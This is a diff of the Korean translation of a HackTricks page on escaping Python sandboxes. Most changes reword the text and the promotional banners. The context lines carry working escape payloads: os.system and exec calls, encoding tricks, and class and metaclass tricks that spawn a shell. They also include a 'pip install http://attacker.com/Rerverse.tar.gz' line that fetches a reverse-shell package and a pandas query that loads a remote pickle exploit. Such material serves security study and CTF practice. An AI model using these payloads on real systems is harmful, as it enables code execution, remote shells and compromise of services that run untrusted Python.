@@ -2,23 +2,31 @@
 
 <details>
 
-<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 **제로부터 영웅이 되는 AWS 해킹을 배우세요**!</summary>
+<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 **제로부터 영웅이 되는 AWS 해킹 배우기**</summary>
 
 HackTricks를 지원하는 다른 방법:
 
-* **회사를 HackTricks에서 광고하거나 PDF로 다운로드하고 싶다면** [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
-* [**공식 PEASS & HackTricks 굿즈**](https://peass.creator-spring.com)를 구매하세요
+* **회사가 HackTricks에 광고되길 원하거나 PDF로 HackTricks를 다운로드하고 싶다면** [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
+* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
-* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)를 **팔로우**하세요.
+* **💬 [Discord 그룹](https://discord.gg/hRep4RUj7f)** 또는 [텔레그램 그룹](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
 * **해킹 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.
 
 </details>
+
+**Try Hard Security Group**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
+***
 
 이것은 Python 샌드박스 보호를 우회하고 임의의 명령을 실행하는 몇 가지 트릭입니다.
 
 ## 명령 실행 라이브러리
 
-첫 번째로 알아야 할 것은 이미 가져온 라이브러리로 코드를 직접 실행할 수 있는지 여부이거나 이러한 라이브러리 중 하나를 가져올 수 있는지입니다:
+첫 번째로 알아야 할 것은 이미 가져온 라이브러리로 코드를 직접 실행할 수 있는지 여부이거나 다음 라이브러리 중 하나를 가져올 수 있는지입니다:
 ```python
 os.system("ls")
 os.popen("ls").read()
@@ -51,7 +59,7 @@ open('/var/www/html/input', 'w').write('123')
 execfile('/usr/lib/python2.7/os.py')
 system('ls')
 ```
-_**open**_ 및 _**read**_ 함수는 파이썬 샌드박스 내부의 파일을 **읽고**, 샌드박스를 **우회**하는 데 유용할 수 있습니다.
+_**open**_ 및 _**read**_ 함수는 파이썬 샌드박스 내에서 파일을 **읽고**, 샌드박스를 **우회**하는 데 유용할 수 있습니다.
 
 {% hint style="danger" %}
 **Python2 input()** 함수는 프로그램이 충돌하기 전에 파이썬 코드를 실행할 수 있습니다.
@@ -66,7 +74,7 @@ _**open**_ 및 _**read**_ 함수는 파이썬 샌드박스 내부의 파일을 *
 ### 기본 패키지
 
 여기에서 **사전 설치된** 패키지 목록을 찾을 수 있습니다: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
-pickle을 통해 시스템에 설치된 임의의 라이브러리를 **가져올 수 있습니다**.\
+pickle을 통해 시스템에 설치된 **임의의 라이브러리를 가져올 수 있습니다.**\
 예를 들어, 다음 pickle은 로드될 때 pip 라이브러리를 가져와 사용할 것입니다:
 ```python
 #Note that here we are importing the pip library so the pickle is created correctly
@@ -86,26 +94,26 @@ print(base64.b64encode(pickle.dumps(P(), protocol=0)))
 
 **@isHaacK**가 공유한 트릭
 
-만약 `pip` 또는 `pip.main()`에 액세스할 수 있다면 임의의 패키지를 설치하고 역술을 얻을 수 있습니다.
+`pip` 또는 `pip.main()`에 액세스할 수 있다면 임의의 패키지를 설치하고 역쉘을 얻을 수 있습니다.
 ```bash
 pip install http://attacker.com/Rerverse.tar.gz
 pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 ```
-파이썬 샌드박스를 우회하는 패키지를 다운로드할 수 있습니다. 사용하기 전에 **압축을 푼 다음 `setup.py`를 변경하고 역쉘용 IP를 입력**해야 합니다:
+파일을 다운로드하여 역쉘을 생성할 수 있습니다. 사용하기 전에 **압축을 푼 다음 `setup.py`를 변경하고 역쉘에 대한 IP를 입력해야 합니다**:
 
 {% file src="../../../.gitbook/assets/reverse.tar.gz" %}
 
 {% hint style="info" %}
-이 패키지는 `Reverse`라고 불립니다. 그러나 역쉘을 종료할 때 나머지 설치가 실패하도록 특별히 제작되었으므로, **서버에 추가적인 파이썬 패키지가 설치되지 않습니다**.
+이 패키지는 `Reverse`라고 불립니다. 그러나 역쉘을 종료할 때 나머지 설치가 실패하도록 특별히 제작되었으므로, 서버에 **추가적인 파이썬 패키지가 설치되지 않도록** 합니다.
 {% endhint %}
 
-## 파이썬 코드 평가하기
+## 파이썬 코드 평가
 
 {% hint style="warning" %}
-exec는 여러 줄 문자열과 ";"을 허용하지만, eval은 그렇지 않습니다 (walrus 연산자 확인)
+exec는 여러 줄 문자열과 ";"을 허용하지만, eval은 그렇지 않습니다 (walrus operator 확인)
 {% endhint %}
 
-특정 문자가 금지된 경우 **16진수/8진수/B64** 표현을 사용하여 제한을 **우회**할 수 있습니다:
+특정 문자가 금지되어 있는 경우 **16진수/8진수/B64** 표현을 사용하여 제한을 **우회**할 수 있습니다:
 ```python
 exec("print('RCE'); __import__('os').system('ls')") #Using ";"
 exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
@@ -140,7 +148,7 @@ df.query("@pd.read_pickle('http://0.0.0.0:6334/output.exploit')")
 # Like:
 df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']('print(1)')")
 ```
-## 연산자 및 간편한 트릭
+## 연산자 및 단축 트릭
 ```python
 # walrus operator allows generating variable inside a list
 ## everything will be executed in order
@@ -151,7 +159,7 @@ df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']
 ```
 ## 인코딩을 통한 보호 기능 우회 (UTF-7)
 
-[**이 설명서**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy)에서 UFT-7이 사용되어 표면적인 샌드박스 내에서 임의의 파이썬 코드를 로드하고 실행합니다:
+[**이 설명서**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy)에서 UFT-7은 표면적인 샌드박스 내에서 임의의 파이썬 코드를 로드하고 실행하는 데 사용됩니다:
 ```python
 assert b"+AAo-".decode("utf_7") == "\n"
 
@@ -166,7 +174,7 @@ return x
 
 ## 호출 없이 Python 실행
 
-**호출을 허용하지 않는** Python 감옥 안에 있다면, 여전히 **임의의 함수, 코드** 및 **명령을 실행**할 수 있는 몇 가지 방법이 있습니다.
+**호출을 허용하지 않는 Python 감옥** 안에 있다면 여전히 **임의의 함수, 코드** 및 **명령을 실행**할 수 있는 몇 가지 방법이 있습니다.
 
 ### [데코레이터](https://docs.python.org/3/glossary.html#term-decorator)를 사용한 RCE
 ```python
@@ -192,11 +200,11 @@ class _:pass
 ```
 ### RCE 객체 생성 및 오버로딩
 
-만약 **클래스를 선언**하고 **해당 클래스의 객체를 생성**할 수 있다면, **직접 호출하지 않고도** **트리거될 수 있는 다양한 메소드를 작성/덮어쓸** 수 있습니다.
+만약 **클래스를 선언**하고 **해당 클래스의 객체를 생성**할 수 있다면, **다른 메소드를 작성/덮어쓸** 수 있어서 **직접 호출하지 않고도** **트리거**될 수 있습니다.
 
 #### 사용자 정의 클래스를 통한 RCE
 
-일부 **클래스 메소드**를 수정하여 (_기존 클래스 메소드를 덮어쓰거나 새로운 클래스를 생성하여_) **직접 호출하지 않고도 트리거될 때** **임의의 코드를 실행**할 수 있습니다.
+일부 **클래스 메소드**를 수정하여 (기존 클래스 메소드를 덮어쓰거나 새 클래스를 생성하여) **직접 호출하지 않고도 트리거**될 때 **임의의 코드를 실행**할 수 있습니다.
 ```python
 # This class has 3 different ways to trigger RCE without directly calling any function
 class RCE:
@@ -248,7 +256,7 @@ __ixor__ (k ^= 'import os; os.system("sh")')
 ```
 #### [메타클래스](https://docs.python.org/3/reference/datamodel.html#metaclasses)를 사용하여 객체 생성하기
 
-메타클래스가 허용하는 주요 기능은 **생성자를 직접 호출하지 않고 대상 클래스를 메타클래스로 사용하여 새 클래스를 생성함으로써 클래스의 인스턴스를 만드는 것**입니다.
+메타클래스가 허용하는 주요 기능은 **생성자를 직접 호출하지 않고 대상 클래스를 메타클래스로 하는 새 클래스를 생성함으로써 클래스의 인스턴스를 만드는 것**입니다.
 ```python
 # Code from https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/ and fixed
 # This will define the members of the "subclass"
@@ -265,7 +273,7 @@ Sub['import os; os.system("sh")']
 ```
 #### 예외를 사용하여 객체 생성
 
-**예외가 트리거되면**, **Exception**의 객체가 **직접 생성되지 않아도** 생성됩니다([**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez)의 꿍꿍거림):
+**예외가 트리거되면**, **Exception**의 객체가 **직접 생성자를 호출하지 않아도** 생성됩니다 ([**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez)의 소소한 꿀팁):
 ```python
 class RCE(Exception):
 def __init__(self):
@@ -307,7 +315,7 @@ __iadd__ = eval
 __builtins__.__import__ = X
 {}[1337]
 ```
-### 내장 도움말 및 라이선스로 파일 읽기
+### 내장 도움말 및 라이선스를 사용하여 파일 읽기
 ```python
 __builtins__.__dict__["license"]._Printer__filenames=["flag"]
 a = __builtins__.help
@@ -328,10 +336,10 @@ __builtins__.__dict__['__import__']("os").system("ls")
 ```
 ### 내장 함수 없음
 
-`__builtins__`가 없는 경우에는 **모든 전역 함수** (예: `open`, `import`, `print`...)가 **로드되지 않기** 때문에 아무 것도 가져오거나 파일을 읽거나 쓸 수 없습니다.\
-그러나 **기본적으로 파이썬은 많은 모듈을 메모리에 가져옵니다**. 이러한 모듈은 무해해 보일 수 있지만, 그 중 일부는 **위험한** 기능을 내부에 가져와서 심지어 **임의의 코드 실행**을 얻을 수 있습니다.
+`__builtins__`가 없는 경우에는 **모든 전역 함수** (예: `open`, `import`, `print` 등)이 **로드되지 않기** 때문에 아무 것도 가져오거나 파일을 읽거나 쓸 수 없습니다.\
+그러나 **기본적으로 Python은 많은 모듈을 메모리에 가져옵니다**. 이러한 모듈은 무해해 보일 수 있지만, 그 중 일부는 **위험한** 기능을 내부에 가져와서 심지어 **임의의 코드 실행**을 얻을 수 있습니다.
 
-다음 예제에서는 이러한 "**무해한**" 모듈 중 일부를 **남용**하여 내부에 있는 **위험한** **기능**에 **액세스**하는 방법을 살펴볼 수 있습니다.
+다음 예제에서는 이러한 "**무해한**" 모듈 중 일부를 **남용**하여 그 내부에 있는 **위험한** **기능**에 **액세스**하는 방법을 살펴볼 수 있습니다.
 
 **Python2**
 ```python
@@ -375,7 +383,7 @@ get_flag.__globals__['__builtins__']
 # Get builtins from loaded classes
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
 ```
-[**아래에는 더 큰 함수가 있습니다**](./#recursive-search-of-builtins-globals) **내장 항목**을 찾을 수 있는 **수십**/**수백 곳**을 찾을 수 있는 함수가 있습니다.
+[**아래에는 더 큰 함수**](./#recursive-search-of-builtins-globals)가 있습니다. 여기서 **수십**/**수백 곳**에서 **builtins**를 찾을 수 있습니다.
 
 #### Python2 및 Python3
 ```python
@@ -391,9 +399,9 @@ __builtins__["__import__"]("os").system("ls")
 # There are lots of other payloads that can be abused to execute commands
 # See them below
 ```
-## 전역 및 지역 변수
+## 전역 변수와 지역 변수
 
-**`globals`**와 **`locals`**를 확인하는 것은 액세스할 수 있는 것을 파악하는 좋은 방법입니다.
+**`globals`**와 **`locals`**를 확인하는 것은 접근할 수 있는 것을 알아내는 좋은 방법입니다.
 ```python
 >>> globals()
 {'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}
@@ -464,7 +472,7 @@ defined_func.__class__.__base__.__subclasses__()
 ```python
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
 ```
-우리는 **명령어를 실행하는 데 사용될 수 있는 다른 라이브러리**로도 똑같은 작업을 할 수 있습니다:
+우리는 **명령어를 실행하는 데 사용될 수 있는 다른 라이브러리**로도 똑같은 작업을 수행할 수 있습니다:
 ```python
 #os
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" in x.__init__.__globals__ ][0]["os"].system("ls")
@@ -678,10 +686,10 @@ main()
 
 ## Python 포맷 문자열
 
-**문자열**을 **보내면**, **포맷**할 때 `{}`를 사용하여 **파이썬 내부 정보에 액세스**할 수 있습니다. 이전 예제를 사용하여 글로벌 또는 내장 항목에 액세스할 수 있습니다.
+파이썬에 **문자열을 보내면서** **포맷**할 때, `{}`를 사용하여 **파이썬 내부 정보에 접근**할 수 있습니다. 이전 예제를 사용하여 글로벌 또는 내장 항목에 접근할 수 있습니다.
 
 {% hint style="info" %}
-그러나 **제한 사항**이 있습니다. `.[]` 기호만 사용할 수 있으므로 **임의의 코드를 실행할 수는 없고** 정보만 읽을 수 있습니다.\
+그러나 **제한 사항**이 있습니다. `.[]` 기호만 사용할 수 있으므로 **임의의 코드를 실행할 수는 없고** 정보를 읽기만 할 수 있습니다.\
 _**이 취약점을 통해 코드를 실행하는 방법을 알고 있다면 저에게 연락해주세요.**_
 {% endhint %}
 ```python
@@ -703,7 +711,7 @@ people = PeopleInfo('GEEKS', 'FORGEEKS')
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
 get_name_for_avatar(st, people_obj = people)
 ```
-참고로 `people_obj.__init__`와 같이 **점**을 사용하여 **속성에 액세스**할 수 있으며, 딕셔너리 요소는 따옴표 없이 **괄호**를 사용하여 액세스할 수 있습니다. `__globals__[CONFIG]`
+참고로 `people_obj.__init__`와 같이 **점**을 사용하여 **속성에 액세스**할 수 있으며, 딕셔너리 요소에는 따옴표 없이 **괄호**를 사용하여 액세스할 수 있습니다. `__globals__[CONFIG]`
 
 또한 객체의 요소를 나열하기 위해 `.__dict__`를 사용할 수 있습니다. `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
 
@@ -712,7 +720,7 @@ get_name_for_avatar(st, people_obj = people)
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
 get_name_for_avatar(st, people_obj = people)
 ```
-게다가, 클래스에서 **새로운 형식 지정자를 작성**할 수도 있습니다:
+또한, 클래스에서 **새로운 형식 지정자를 작성**할 수 있습니다:
 ```python
 class HAL9000(object):
 def __format__(self, format):
@@ -723,10 +731,10 @@ return 'HAL 9000'
 '{:open-the-pod-bay-doors}'.format(HAL9000())
 #I'm afraid I can't do that.
 ```
-**포맷 문자열** 예제에 대한 **더 많은 예제**는 [**https://pyformat.info/**](https://pyformat.info)에서 찾을 수 있습니다.
+**포맷 문자열**에 관한 **더 많은 예제**는 [**https://pyformat.info/**](https://pyformat.info)에서 찾을 수 있습니다.
 
 {% hint style="danger" %}
-또한 **Python 내부 객체에서 민감한 정보를 읽는 가젯**에 대한 정보는 다음 페이지도 확인하십시오:
+**Python 내부 객체에서 민감한 정보를 읽는** 가젯에 대한 자세한 내용은 다음 페이지도 확인하세요:
 {% endhint %}
 
 {% content-ref url="../python-internal-read-gadgets.md" %}
@@ -744,13 +752,13 @@ return 'HAL 9000'
 # Access an element through several links
 {whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__}
 ```
-## Python 객체 해체
+## Python 객체 해부
 
 {% hint style="info" %}
-만약 **파이썬 바이트코드**에 대해 **자세히** 알고 싶다면, 이 **멋진** 주제에 대한 글을 읽어보세요: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
+만약 **파이썬 바이트코드**에 대해 **자세히** 알고 싶다면 이 **멋진** 주제에 대한 글을 읽어보세요: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
 {% endhint %}
 
-일부 CTF에서는 **플래그가 있는 사용자 정의 함수의 이름**이 제공될 수 있으며, **내부**의 **함수**를 살펴보고 추출해야 할 수도 있습니다.
+일부 CTF에서는 **플래그가 있는 사용자 정의 함수의 이름**이 제공될 수 있으며, **함수**의 **내부**를 살펴보고 추출해야 할 수도 있습니다.
 
 조사할 함수는 다음과 같습니다:
 ```python
@@ -764,15 +772,17 @@ else:
 return "Nope"
 ```
 #### dir
+
+#### 디렉토리
 ```python
 dir() #General dir() to find what we have loaded
 ['__builtins__', '__doc__', '__name__', '__package__', 'b', 'bytecode', 'code', 'codeobj', 'consts', 'dis', 'filename', 'foo', 'get_flag', 'names', 'read', 'x']
 dir(get_flag) #Get info tof the function
 ['__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__doc__', '__format__', '__get__', '__getattribute__', '__globals__', '__hash__', '__init__', '__module__', '__name__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'func_closure', 'func_code', 'func_defaults', 'func_dict', 'func_doc', 'func_globals', 'func_name']
 ```
-#### 전역 변수
+#### globals
 
-`__globals__` 및 `func_globals`(동일)은 전역 환경을 획득합니다. 예제에서는 가져온 모듈, 일부 전역 변수 및 선언된 내용을 볼 수 있습니다:
+`__globals__` 및 `func_globals`(동일) 전역 환경을 획득합니다. 예제에서는 가져온 모듈, 일부 전역 변수 및 선언된 내용을 볼 수 있습니다:
 ```python
 get_flag.func_globals
 get_flag.__globals__
@@ -785,7 +795,7 @@ CustomClassObject.__class__.__init__.__globals__
 
 ### **함수 코드에 액세스하기**
 
-**`__code__`** 및 `func_code`: 함수의 이 **속성에 액세스**하여 함수의 코드 객체를 **얻을 수** 있습니다.
+**`__code__`** 및 `func_code`: 함수의 이 **속성에 액세스**하여 함수의 코드 객체를 **얻을 수 있습니다**.
 ```python
 # In our current example
 get_flag.__code__
@@ -873,7 +883,7 @@ dis.dis(get_flag)
 44 LOAD_CONST               0 (None)
 47 RETURN_VALUE
 ```
-**만약 파이썬 샌드박스에서 `dis`를 import할 수 없는 경우** 함수의 **바이트 코드**(`get_flag.func_code.co_code`)를 얻어서 로컬에서 **disassemble**할 수 있습니다. 로드되는 변수의 내용(`LOAD_CONST`)을 볼 수는 없지만 `LOAD_CONST`는 로드되는 변수의 오프셋을 알려주기 때문에 (`get_flag.func_code.co_consts`)에서 추측할 수 있습니다.
+**만약 파이썬 샌드박스에서 `dis`를 import할 수 없는 경우** 함수의 **바이트 코드**(`get_flag.func_code.co_code`)를 얻어서 로컬에서 **disassemble**할 수 있습니다. 로드되는 변수의 내용(`LOAD_CONST`)을 볼 수 없지만 `LOAD_CONST`는 로드되는 변수의 오프셋을 알려주므로 (`get_flag.func_code.co_consts`)에서 추측할 수 있습니다.
 ```python
 dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
 0 LOAD_CONST          1 (1)
@@ -897,8 +907,8 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 ```
 ## Python 컴파일
 
-이제, 실행할 수 없는 함수에 대한 정보를 덤프할 수 있다고 상상해 봅시다. 그러나 그 함수를 실행해야 하는 상황이라고 가정해 봅시다.\
-다음 예제와 같이, 해당 함수의 코드 객체에 액세스할 수 있지만 disassemble을 읽어도 플래그를 계산하는 방법을 모른다고 가정해 봅시다. (더 복잡한 `calc_flag` 함수를 상상해 보세요)
+이제, 실행할 수 없지만 실행해야 하는 함수에 대한 정보를 **덤프할 수 있다고 상상해 봅시다**.\
+다음 예제에서처럼, 해당 함수의 **코드 객체에 액세스할 수 있지만** disassemble을 읽어도 **플래그를 계산하는 방법을 모를 수 있습니다** (_더 복잡한 `calc_flag` 함수를 상상해보세요_).
 ```python
 def get_flag(some_input):
 var1=1
@@ -933,7 +943,7 @@ mydict['__builtins__'] = __builtins__
 function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 {% hint style="info" %}
-파이썬 버전에 따라 `code_type`의 **매개변수**가 **다른 순서**를 가질 수 있습니다. 실행 중인 파이썬 버전에서 매개변수의 순서를 알아내는 가장 좋은 방법은 다음을 실행하는 것입니다:
+파이썬 버전에 따라 `code_type`의 **매개변수**가 **다른 순서**를 가질 수 있습니다. 실행 중인 파이썬 버전의 매개변수 순서를 알아내는 가장 좋은 방법은 다음을 실행하는 것입니다:
 ```
 import types
 types.CodeType.__doc__
@@ -944,7 +954,7 @@ types.CodeType.__doc__
 ### 누설된 함수 재현
 
 {% hint style="warning" %}
-다음 예제에서는 함수 코드 객체에서 직접 함수를 재현하는 데 필요한 모든 데이터를 가져올 것입니다. **실제 예제**에서는 함수를 실행하는 데 필요한 모든 **값**이 **누설되어야 할 것**입니다.
+다음 예제에서는 함수 코드 객체에서 필요한 모든 데이터를 가져와 함수를 재현할 것입니다. **실제 예제**에서는 함수를 실행하기 위한 모든 **값**이 **누설해야 할 것**입니다.
 {% endhint %}
 ```python
 fc = get_flag.__code__
@@ -958,7 +968,7 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 ### 방어 우회
 
-이 게시물 초반의 이전 예제에서 **`compile` 함수를 사용하여 모든 파이썬 코드를 실행하는 방법**을 볼 수 있습니다. 이것은 **루프와 함께 전체 스크립트를 실행**할 수 있어서 흥미로운데, 이를 **한 줄로** 할 수 있습니다 (**`exec`를 사용하여 동일한 작업을 수행할 수도 있음).\
+이 게시물 초반의 이전 예제에서 **`compile` 함수를 사용하여 모든 파이썬 코드를 실행하는 방법**을 볼 수 있습니다. 이것은 **루프와 함께 전체 스크립트를 실행**할 수 있기 때문에 흥미로운데, 이를 **한 줄로** 실행할 수 있습니다 (**`exec`를 사용하여 동일한 작업을 수행할 수도 있음).\
 어쨌든, 때로는 **로컬 머신**에서 **컴파일된 객체**를 **생성**하고 **CTF 머신**에서 실행하는 것이 유용할 수 있습니다 (예를 들어, CTF에 `compiled` 함수가 없기 때문에).
 
 예를 들어, _./poc.py_를 읽는 함수를 수동으로 컴파일하고 실행해 봅시다:
@@ -988,7 +998,7 @@ mydict['__builtins__'] = __builtins__
 codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
 function_type(codeobj, mydict, None, None, None)()
 ```
-만약 `eval` 또는 `exec`에 접근할 수 없다면 **적절한 함수**를 생성할 수 있지만, 직접 호출하려고 하면 일반적으로 _제한된 모드에서 접근할 수 없는 생성자_로 실패할 것입니다. 따라서 **제한된 환경에 없는 함수가 이 함수를 호출하도록 해야 합니다.**
+만약 `eval` 또는 `exec`에 접근할 수 없는 경우 **적절한 함수**를 생성할 수 있지만, 직접 호출하려고 하면 일반적으로 _제한된 모드에서 접근할 수 없는 생성자_로 실패할 것입니다. 따라서 **제한된 환경에 없는 함수가 이 함수를 호출하도록 해야 합니다.**
 ```python
 #Compile a regular print
 ftype = type(lambda: None)
@@ -996,7 +1006,7 @@ ctype = type((lambda: None).func_code)
 f = ftype(ctype(1, 1, 1, 67, '|\x00\x00GHd\x00\x00S', (None,), (), ('s',), 'stdin', 'f', 1, ''), {})
 f(42)
 ```
-## 컴파일된 Python을 디컴파일하기
+## 컴파일된 Python의 디컴파일
 
 [**https://www.decompiler.com/**](https://www.decompiler.com)과 같은 도구를 사용하면 주어진 컴파일된 Python 코드를 **디컴파일** 할 수 있습니다.
 
@@ -1029,18 +1039,22 @@ print(f"\nNot a Super User!!!\n")
 * [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html)
 * [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
 
-***
+**Try Hard Security Group**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
 
 <details>
 
-<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로부터 AWS 해킹을 전문가로 배우세요</summary>
+<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로부터 영웅이 될 때까지 AWS 해킹을 배우세요!</summary>
 
 HackTricks를 지원하는 다른 방법:
 
-* **회사를 HackTricks에서 광고하거나 PDF로 다운로드하려면** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
-* [**공식 PEASS & HackTricks 스왹**](https://peass.creator-spring.com)을 구매하세요
+* **회사가 HackTricks에 광고되길 원하거나 PDF로 HackTricks를 다운로드하고 싶다면** [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
+* [**공식 PEASS & HackTricks 스왑**](https://peass.creator-spring.com)을 구입하세요
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
-* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f)에 가입하거나 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나** 트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
-* **해킹 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.
+* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f)이나 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나** 트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
+* **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 요령을 공유하세요.**
 
 </details>
